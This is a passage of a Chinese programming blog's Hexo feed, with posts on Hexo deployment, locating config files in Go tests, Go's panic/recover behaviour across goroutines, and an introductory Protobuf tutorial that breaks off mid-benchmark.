<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https:&#x2F;&#x2F;github.com&#x2F;YourgithubName&#x2F;YourgithubName.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<p>为了更好的提交代码，我们需要安装一个插件 <code>npm install hexo-deployer-git --save</code></p>
<p>然后，我们使用<code>hexo d</code>就可以把代码提交到Github仓库了。</p>
<blockquote>
<p>等等。。。有人说网上很多文章还说要配置什么ssh秘钥，其实这块我觉得不是必须的，只是为了更方便的提交代码而已，具体步骤这里不再赘述。</p>
</blockquote>
<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>Hexo更换主题特别简单，只需要把主题文件夹clone到themes文件里面，然后修改_config.yml里面的 theme 配置项。</p>
<p>详细的步骤我这里就不解释了，你可以在Github使用 “hexo themes”关键字搜索，然后按照其readme文档说明安装即可，非常简单。</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>如果你配置了ssh秘钥，则必须把deploy配置里的repo配置 https 地址改成 ssh 地址。</li>
<li>很多主题都有一个自己的_config.yml配置文件，里面有一些详细配置，比如是Next这个主题默认没有打开分类和标签项，需自己配置。</li>
<li>如果想实现“阅读全文”这种效果，有2种方式，第一种是需自己在markdown里合适的位置作注解，默认是 <code>&lt;!--more--&gt;</code>，还有一种在主题的配置里面，可以自动根据字数折叠，但是默认不推荐这种方式。</li>
<li>每个主题都有很多自定义的配置项，比如样式、字体、评论、浏览数，很多默认都没开启，可以好好看一下，都有注释。</li>
<li>最重要的一点，所有的东西都是开源的，如果你觉得很多样式或者细节不合适完全可以打开模板修改定制。</li>
</ol>
<p>最后，如果你闲麻烦，觉得我的博客还可以，想参考一下可以访问我的<a href="https://github.com/wangbjun/blog_hexo" target="_blank" rel="noopener">Github</a>，所有的文件和配置都在里面，欢迎采用。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Golang测试配置文件加载问题</title>
    <url>/2019/coding/golang/golang-gin-config.html</url>
    <content><![CDATA[<p>最近在写Go的项目，使用的框架是Gin，众所周知，Gin是一个比较简单的框架，只提供了核心功能，并没有配置文件模块，所以这块得自己搞了，Go的第三方解析配置的库非常多，无论是ini、yaml、json文件支持都非常好，而且Go的项目一般都是常驻进程的，所以只需要在项目启动的时候解析一次就行可以了。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>最简单的办法通常就是定义一个全局的配置变量供其它包使用，在init函数里面初始化加载配置文件，示例如下：</p>
<a id="more"></a>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"gopkg.in/ini.v1"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf Config</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Config <span class="keyword">struct</span> &#123;</span><br><span class="line">    App      App</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> App <span class="keyword">struct</span> &#123;</span><br><span class="line">    Port    <span class="keyword">string</span></span><br><span class="line">    Debug   <span class="keyword">string</span></span><br><span class="line">    Url     <span class="keyword">string</span></span><br><span class="line">    LogFile <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    envFile := <span class="string">"app.ini"</span></span><br><span class="line">    conf, err := ini.Load(envFile)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Panicf(<span class="string">"parse conf file [%s] failed, err: %s"</span>, envFile, err.Error())</span><br><span class="line">    &#125;</span><br><span class="line">    sectionApp := conf.Section(<span class="string">"APP"</span>)</span><br><span class="line">    Conf.App = App&#123;</span><br><span class="line">        Port:    sectionApp.Key(<span class="string">"PORT"</span>).String(),</span><br><span class="line">        Debug:   sectionApp.Key(<span class="string">"DEBUG"</span>).String(),</span><br><span class="line">        Url:     sectionApp.Key(<span class="string">"URL"</span>).String(),</span><br><span class="line">        LogFile: sectionApp.Key(<span class="string">"LOG_FILE"</span>).String(),</span><br><span class="line">    &#125;</span><br><span class="line">    log.Println(<span class="string">"init config file success"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认情况下，入口文件main.go文件都是位于项目根目录下面，和app.ini文件同级，所以这种写法完全没问题。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>但是当你跑测试用例的时候，而且当这个测试用例并不在项目根目录的时候就会产生问题: 找不到配置文件。</p>
<p>原因很简单，Go的测试用例最佳实践是和被测试的文件放在一起，所以测试文件可能在二级、三级甚至多级目录里面，如下图：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">├── app.ini</span><br><span class="line">├── config</span><br><span class="line">│   ├── Config.go</span><br><span class="line">│   └── DataBase.go</span><br><span class="line">├── controller</span><br><span class="line">│   ├── BaseController.go</span><br><span class="line">├── lib</span><br><span class="line">│   ├── <span class="keyword">function</span></span><br><span class="line">│   │   ├── Aes.go</span><br><span class="line">│   │   ├── Rsa.go</span><br><span class="line">│   │   ├── Rsa_test.go</span><br><span class="line">│   │   └── Uuid.go</span><br><span class="line">│   ├── httpLogger</span><br><span class="line">│   │   └── HttpLogger.go</span><br><span class="line">│   └── zlog</span><br><span class="line">│       ├── SqlLog.go</span><br><span class="line">│       └── ZapLogger.go</span><br><span class="line">├── main.go</span><br></pre></td></tr></table></figure>
<p>所以在测试文件的目录下肯定是找不到app.ini的，咋办呢？解决方法有很多</p>
<ul>
<li><p>copy一个配置到测试文件。这种方法最简单粗暴，但是太不灵活，测试用例可能在任何目录里面，这样搞有点难受</p>
</li>
<li><p>配置文件路径写成绝对路径。这种方法也不灵活，毕竟每个人的项目目录位置不一样，以后线上部署也麻烦</p>
</li>
<li><p>采用依赖注入的高级写法，测试的时候使用mock的方式注入配置。这种方法可以，也是比较好的方式，但是需要引入依赖注入组件，整个项目的架构需要更改，不推荐使用依赖注入把简单的问题复杂化。</p>
</li>
<li><p>跑测试的时候传入外部参数，依然不够灵活，而且麻烦</p>
</li>
</ul>
<p>这个问题，我思考了很久，最终想了一个足够简单灵活的方式，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">envFile := <span class="string">"app.ini"</span></span><br><span class="line"><span class="comment">// 读取配置文件, 解决跑测试的时候找不到配置文件的问题，最多往上找5层目录</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">    <span class="keyword">if</span> _, err := os.Stat(envFile); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        envFile = <span class="string">"../"</span> + envFile</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">conf, err := ini.Load(envFile)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Panicf(<span class="string">"parse conf file [%s] failed, err: %s"</span>, envFile, err.Error())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用一个for循环解决了这个问题，如果怕不够保险，可以改成10，大多数项目目录应该不会这么深，虽然不够优雅，但是还是相对比较简单的。</p>
<p>各位有什么更好的方法吗？有的话请留言指教</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈Golang的recover异常处理机制</title>
    <url>/2019/coding/golang/golang-recover.html</url>
    <content><![CDATA[<h2 id="1-error"><a href="#1-error" class="headerlink" title="1.error"></a>1.error</h2><p>Golang被诟病非常多的一点就是缺少强大方便的异常处理机制，大部分高级编程语言，比如Java、PHP、Python等都拥有一种try catch机制，这种异常捕获机制可以非常方便的处理程序运行中可能出现的各种意外情况。</p>
<p>严格来说，在Go里面，错误和异常是2种不同的类型，错误一般是指程序产生的逻辑错误，或者意料之中的意外情况，而且异常一般就是panic，比如角标越界、段错误。</p>
<a id="more"></a>

<p>对于错误，Golang采用了一种非常原始的手段，我们必须手动处理可能产生的每一个错误，一般会把错误返回给调用方，下面这种写法在Go里面十分常见：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"errors"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s, err := say()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"%s\n"</span>, err.Error())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"%s\n"</span>, s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">()</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>, errors.New(<span class="string">"something error"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种写法最大的问题就是每一个error都需要判断处理，非常繁琐，如果使用try catch机制，我们就可以统一针对多个函数调用可能产生的错误做处理，节省一点代码和时间。不过咱们今天不是来讨论Go的异常错误处理机制的，这里只是简单说一下。</p>
<h2 id="2-panic"><a href="#2-panic" class="headerlink" title="2.panic"></a>2.panic</h2><p>一般错误都是显示的，程序明确返回的，而异常往往是隐示的，不可预测的，比如下面的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">5</span>,<span class="number">2</span>))</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">5</span>,<span class="number">0</span>)) <span class="comment">//panic: runtime error: integer divide by zero </span></span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">9</span>,<span class="number">5</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cal</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a / b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在执行第三个计算的时候会发生一个panic，这种错误会导致程序退出，下面的代码的就无法执行了。当然你可以说这种错误理论上是可以预测的，我们只要在cal函数内部做好处理就行了。</p>
<p>然而实际开发中，会发生panic的地方可能特别多，而且不是这种一眼就能看出来的，在Web服务中，这样的panic会导致整个Web服务挂掉，特别危险。</p>
<h2 id="3-recover"><a href="#3-recover" class="headerlink" title="3.recover"></a>3.recover</h2><p>虽然没有try catch机制，Go其实有一种类似的recover机制，功能弱了点，用法很简单：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">5</span>, <span class="number">2</span>))</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">5</span>, <span class="number">0</span>))</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, cal(<span class="number">9</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cal</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Printf(<span class="string">"%s\n"</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">return</span> a / b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，大家得理解defer的作用，简单说defer就类似于面向对象里面的析构函数，在这个函数终止的时候会执行，即使是panic导致的终止。</p>
<p>所以，在cal函数里面每次终止的时候都会检查有没有异常产生，如果产生了我们可以处理，比如说记录日志，这样程序还可以继续执行下去。</p>
<h2 id="4-注意的坑"><a href="#4-注意的坑" class="headerlink" title="4.注意的坑"></a>4.注意的坑</h2><p>一般defer recover这种机制经常用在常驻进程的应用，比如Web服务，在Go里面，每一个Web请求都会分配一个goroutine去处理，在没有做任何处理的情况下，假如某一个请求发生了panic，就会导致整个服务挂掉，这是不可接受的，所以在Web应用里面必须使用recover保证即使某一个请求发生错误也不影响其它请求。</p>
<p>这里我使用一小段代码模拟一下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    requests := []<span class="keyword">int</span>&#123;<span class="number">12</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">41</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">31</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> n := <span class="keyword">range</span> requests &#123;</span><br><span class="line">        <span class="keyword">go</span> run(n) <span class="comment">//开启多个协程</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">(num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment">//模拟请求错误</span></span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">5</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"请求出错"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这段代码无法完整执行下去，因为其中某一个协程必然会发生panic，从而导致整个应用挂掉，其它协程也停止执行。</p>
<p>解决方法和上面一样，我们只需要在run函数里面加入defer recover，整个程序就会非常健壮，即使发生panic，也会完整的执行下去。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">(num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := <span class="built_in">recover</span>();err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Printf(<span class="string">"%s\n"</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">5</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"请求出错"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码只是演示，真正的坑是：如果你在run函数里面又启动了其它协程，这个协程发生的panic是无法被recover的，还是会导致整个进程挂掉,我们改造了一下上面的例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">run</span><span class="params">(num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Printf(<span class="string">"%s\n"</span>, err)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">5</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"请求出错"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">go</span> myPrint(num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myPrint</span><span class="params">(num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"请求又出错了"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"%d\n"</span>, num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我在run函数里面又通过协程的方式调用了另一个函数，而这个函数也会发生panic，你会发现整个程序也挂了，即使run函数有recover也没有任何作用，这意味着我们还需要在myPrint函数里面加入recover。但是如果你不使用协程的方式调用myPrint函数，直接调用的话还是可以捕获recover的。</p>
<p>总结一下就是defer recover这种机制只是针对当前函数和以及直接调用的函数可能产生的panic，它无法处理其调用产生的其它协程的panic，这一点和try catch机制不一样。</p>
<p>理论上讲，所有使用协程的地方都必须做defer recover处理，这样才能保证你的应用万无一失，不过开发中可以根据实际情况而定，对于一些不可能出错的函数加了还影响性能。</p>
<p>Go的Web服务也是一样，默认的recover机制只能捕获一层，如果你在这个请求的处理中又使用了其它协程，那么必须非常慎重，毕竟只要发生一个panic，整个Web服务就会挂掉。</p>
<p>最后，总结一下，Go的异常处理机制虽然没有很多其它语言高效，但是基本上还是能满足需求，目前官方已经在着完善这一点，Go2可能会见到。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Protobuf入门和实战</title>
    <url>/2019/coding/golang/golang-protobuf.html</url>
    <content><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Protobuf（Google Protocol Buffer）是 Google公司内部的混合语言数据标准，目前已经开源，支持多种语言（C++、C#、Go、JS、Java、Python、PHP），它是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。</p>
<p>说简单点，Protobuf就是类似JSON、XML这样的数据交换格式，当今互联网JSON是最流行的格式了，XML用的也挺多，最初接触到Protobuf是因为gRPC默认使用它作为数据编码，相比于JSON和XML，它更小，更快！</p>
<a id="more"></a>

<p>举个例子：如果我们想表达一个人名字叫John，年龄是28岁，邮箱是<a href="mailto:jdoe@gmail.com">jdoe@gmail.com</a>这样的结构化数据，并且需要在互联网上传输</p>
<ul>
<li><p>使用XML表示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;person&gt;</span><br><span class="line">   &lt;name&gt;John&lt;&#x2F;name&gt;</span><br><span class="line">   &lt;age&gt;28&lt;&#x2F;age&gt;</span><br><span class="line">   &lt;email&gt;jdoe@example.com&lt;&#x2F;email&gt;</span><br><span class="line"> &lt;&#x2F;person&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用JSON表示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name: John,</span><br><span class="line">    age: 28,</span><br><span class="line">    email: jdoe@example.com</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Protobuf表示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">message Person &#123;</span><br><span class="line">    string name &#x3D; 1;</span><br><span class="line">    int32 age &#x3D; 2;</span><br><span class="line">    string email &#x3D; 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>从可读性和表达能力上看，XML最好，JSON其次，而Protobuf这个其实只是一个DSL，用来定义数据结构和类型，实际生成的数据是二进制的，不可读，但Protobuf追求的是性能和速度，关于它们之间的对比，后面再说，咱们先说用法。</p>
<h2 id="2-安装环境"><a href="#2-安装环境" class="headerlink" title="2.安装环境"></a>2.安装环境</h2><p>Protobuf的使用比较麻烦，首先需要安装Protobuf的编译工具(Protocol Buffers compiler)，Ubuntu环境下自带编译环境，其它平台可自行安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ protoc --version</span><br><span class="line">libprotoc 3.8.0</span><br></pre></td></tr></table></figure>
<p>然后还需要安装不同语言的运行环境，具体可以参考<a href="https://github.com/protocolbuffers/Protobuf" target="_blank" rel="noopener">github.com/protocolbuffers/Protobuf</a></p>
<h2 id="3-编写proto文件"><a href="#3-编写proto文件" class="headerlink" title="3.编写proto文件"></a>3.编写proto文件</h2><p>proto其实是一种DSL语法，这个proto文件最终会使用protoc编译成不同语言的文件，然后在程序里面调用，这也是Protobuf跨平台的关键。关于proto文件的语法这里不详细介绍，建议大家参考<a href="https://developers.google.com/protocol-buffers/docs/proto3" target="_blank" rel="noopener">官方文档</a>，东西很多，也很详细。</p>
<p>我这里拿一个简单实际的例子（person.proto）来说明一下，建议大家使用Goland安装一个插件，这样有颜色还可以检查语法：</p>
<ul>
<li>第一行syntax是声明proto语法版本，如果不声明默认是2，建议使用3版本</li>
<li>然后是package也就包，这个影响到最后生成的go文件的包</li>
<li>后面message是用来声明一个数据对象，我觉得可以理解为结构体struct，这个数据对象有自己的数据成员，每个字段有类型和默认值。</li>
<li>proto的数据类型有标量类型和枚举类型，由于不同语言的数据类型不太一样，所以这里的类型和实际语言的类型有一个对应转换关系，具体可以参考官方文档</li>
<li>repeated 相当于声明一个数组，比如在上面的例子，意思就是car是一个string类型的数组</li>
<li>message可以嵌套声明，也可以引用一个类型</li>
<li>最迷惑的东西估计就是后面那个1,2,3,4…了，据官方文档的说法是为了在二进制格式里面标记数据，在每一个message里面必须是唯一的，从最小的1开始，一直可以到2的29次方-1，也就是536870911，但是19000到19999是保留的数字。</li>
</ul>
<p>基本语法还是挺简单的，不过有些深入的用法这里没有介绍到，想要了解的话务必查看官方文档，不过定义数据结构和类型只是第一步，接下来我们还要使用protoc把这个文件编译成对应语言的文件。</p>
<h2 id="4-编译proto文件"><a href="#4-编译proto文件" class="headerlink" title="4.编译proto文件"></a>4.编译proto文件</h2><p>以Go语言为例，建议切换到proto文件目录执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protoc --go_out&#x3D;. person.proto</span><br></pre></td></tr></table></figure>
<p>其中–go_out表示输出go版本的，其它语言把go替换就行了，比如–php_out、–java_out,=后面是需要输出的目录，我选择.表示当前目录，当然你也可以指定输入和输出目录，最后面则是需要编译的文件，可以指定单个文件，也可以使用通配符同时编译多个文件。</p>
<p>执行完命令之后，你会发现当前目录多了一个person.pb.go文件，这是一个标准的go语法文件，里面主要是一个结构体和一些getter函数，其它的我也不太懂是什么意思就不说了，但是并不影响我们使用。</p>
<h2 id="5-使用"><a href="#5-使用" class="headerlink" title="5.使用"></a>5.使用</h2><p>以Go为例，我们需要安装一个<a href="github.com/golang/Protobuf/proto">运行库</a>，其它语言也差不多，官方针对每一个语言都有一个单独的介绍文档，务必查阅一下。</p>
<p>下面是一个完整的案例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"github.com/golang/Protobuf/proto"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">//实例化模型对象，填充数据</span></span><br><span class="line">    p := &amp;Person&#123;</span><br><span class="line">        Id:    <span class="number">1</span>,</span><br><span class="line">        Name:  <span class="string">"jun"</span>,</span><br><span class="line">        Age:   <span class="number">25</span>,</span><br><span class="line">        Money: <span class="number">24.5</span>,</span><br><span class="line">        Car:   []<span class="keyword">string</span>&#123;<span class="string">"car1"</span>, <span class="string">"car2"</span>&#125;,</span><br><span class="line">        Phone: &amp;Person_Phone&#123;Number: <span class="string">"0551-12323232"</span>, Type: <span class="string">"1"</span>&#125;,</span><br><span class="line">        Sex:   Person_female,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Marshal序列化</span></span><br><span class="line">    out, err := proto.Marshal(p)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//序列化得到结果是二进制的，是不可读的，所以这里保存到文件</span></span><br><span class="line">    file, _ := os.OpenFile(<span class="string">"out"</span>, os.O_CREATE|os.O_WRONLY, <span class="number">0666</span>)</span><br><span class="line">    _, _ = file.Write(out)</span><br><span class="line">    _ = file.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//unMarshal还原数据，从文件里面读取</span></span><br><span class="line">    in, _ := os.Open(<span class="string">"out"</span>)</span><br><span class="line">    bytes, err := ioutil.ReadAll(in)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    p1 := &amp;Person&#123;&#125;</span><br><span class="line">    err = proto.Unmarshal(bytes, p1)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//调用string()方法打印，也可以使用其生成的getter函数</span></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, p1.String())</span><br><span class="line">        fmt.Printf(<span class="string">"%d\n"</span>, p1.GetId)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-与JSON对比"><a href="#6-与JSON对比" class="headerlink" title="6.与JSON对比"></a>6.与JSON对比</h2><p>由于XML目前很少使用在Web API接口上，所以这里就不对比了，主要看一下和JSON的对比，包含2个方面：速度和大小。</p>
<p>为了测试，我在proto文件里面又加了一个数据对象，表示一个组里面有多个person对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">message Group &#123;</span><br><span class="line">    repeated Person person &#x3D; 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分别测试有1,10,100个对象的时候对比情况，测试代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkProto</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    g := &amp;Group&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">        p := &amp;Person&#123;</span><br><span class="line">            Id:    <span class="keyword">int32</span>(i),</span><br><span class="line">            Name:  <span class="string">"测试名称"</span>,</span><br><span class="line">            Age:   <span class="keyword">int32</span>(<span class="number">25</span> * i),</span><br><span class="line">            Money: <span class="number">240000.5</span>,</span><br><span class="line">            Car:   []<span class="keyword">string</span>&#123;<span class="string">"car1"</span>, <span class="string">"car2"</span>, <span class="string">"car3"</span>, <span class="string">"car4"</span>, <span class="string">"car5"</span>, <span class="string">"car7"</span>, <span class="string">"car6"</span>, <span class="string">"car21"</span>, <span class="string">"car22"</span>,&#125;,</span><br><span class="line">            Phone: &amp;Person_Phone&#123;Number: <span class="string">"0551-12323232"</span>, Type: <span class="string">"1"</span>&#125;,</span><br><span class="line">            Sex:   Person_female,</span><br><span class="line">        &#125;</span><br><span class="line">        g.Person = <span class="built_in">append</span>(g.Person, p)</span><br><span class="line">    &#125;</span><br><span class="line">    b.ResetTimer()</span><br><span class="line">        b.N = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ 